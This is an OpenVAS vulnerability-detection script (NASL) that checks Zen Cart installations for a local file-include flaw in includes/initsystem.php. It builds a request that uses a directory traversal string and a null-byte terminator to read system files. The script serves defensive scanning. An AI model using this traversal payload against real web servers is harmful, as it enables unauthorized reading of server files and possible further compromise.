###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zencart_44636.nasl 14 2013-10-27 12:33:37Z jan $
#
# Zen Cart 'includes/initsystem.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Zen Cart is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

Zen Cart 1.3.9h is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100894);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-05 13:21:25 +0100 (Fri, 05 Nov 2010)");
 script_bugtraq_id(44636);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Zen Cart 'includes/initsystem.php' Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44636");
 script_xref(name : "URL" , value : "http://www.zen-cart.com/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Zen Cart is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/shop","/cart","/zen-cart",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/includes/initsystem.php?loader_file=",crap(data:"../",length:3*9),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_warning(port:port);
      exit(0);

    }
  }
}
exit(0);
